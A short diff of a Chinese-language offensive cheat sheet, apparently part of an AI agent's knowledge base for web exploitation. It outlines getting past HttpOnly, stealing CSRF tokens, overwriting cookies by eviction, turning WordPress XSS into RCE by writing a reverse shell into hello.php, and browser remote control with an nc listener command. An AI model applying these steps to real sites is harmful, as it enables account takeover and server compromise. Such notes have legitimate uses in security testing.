@@ -77,6 +77,8 @@
 
 **HttpOnly 不是终点**（只防 cookie 窃取）：代理浏览器（fetch 带凭证发请求）｜CSRF via XSS（正则 `/csrf_token['":\s]+([^'"<\s]+)/` 从 DOM 提 token 后改邮箱）｜键盘记录。
 
+**攻击者可写 cookie 时**（输入→`document.cookie` 数据流，bot 浏览器场景）：同路径 HttpOnly 无法 JS 覆盖——路径 shadowing 或 Cookie Jar 溢出驱逐后补写（Chromium 180/域；Priority 驱逐 + LRU），见 `$AGENT_DIR/knowledge-base/bot-patterns.md` §3.4。
+
 **WordPress XSS→RCE**（admin 会话 + plugin-editor 可用）：GET plugin-editor.php 取 `_wpnonce` → POST 写 `hello.php` 反弹 shell 内容 → 访问触发。
 
 **浏览器远控**：setInterval 轮询拉命令脚本；攻击端 `while :; do read c; echo $c | nc -lp 5855; done`。
